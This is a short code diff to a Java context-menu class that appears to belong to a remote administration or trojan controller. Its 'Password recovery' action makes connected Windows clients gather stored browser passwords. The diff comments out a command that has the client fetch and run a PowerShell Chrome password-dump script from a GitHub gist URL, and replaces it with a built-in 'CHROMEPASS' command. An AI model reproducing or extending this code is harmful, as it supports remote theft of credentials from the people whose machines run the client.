@@ -280,7 +280,7 @@ class IPContextMenu implements Repository {
 
         //////// PWD recovery \\\\\\\\
         Menu pwdRecovery = new Menu("Password recovery \u25B6");
-        MenuItem gatherChrome = new MenuItem("Gather Chrome Passwords (win only)");
+        MenuItem gatherChrome = new MenuItem("Gather Browser Passwords (win only)");
         gatherChrome.setOnAction(event -> {
             if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")){
                 if (!clientObject.getSYSTEM_OS().toLowerCase().contains("wind")){
@@ -289,13 +289,13 @@ class IPContextMenu implements Repository {
                 }
                 try {
 
-                    clientObject.clientCommunicate("PSHURL https://gist.github.com/cbrnrd/d7e9870549116ba2ccf1dab96c0b91d0/raw/d33c55e3c20c4505fa1666c9f64d581ee700fa29/Get-ChromeDump-CSV.ps1" );
-
+                    //clientObject.clientCommunicate("PSHURL https://gist.github.com/cbrnrd/d7e9870549116ba2ccf1dab96c0b91d0/raw/d33c55e3c20c4505fa1666c9f64d581ee700fa29/Get-ChromeDump-CSV.ps1" );
+                    clientObject.clientCommunicate("CHROMEPASS");
                     Stage stage = new Stage();
                     stage.initStyle(StageStyle.UNDECORATED);
                     stage.setMinHeight(300);
                     stage.setMinWidth(300);
-                    stage.setScene(new Scene(new ChromePassView().getChromePassView(stage), 800, 900));
+                    stage.setScene(new Scene(new ChromePassView().getChromePassView(stage), 800, 600));
                     stage.show();
                 } catch (IOException ioe){
                     ioe.printStackTrace();
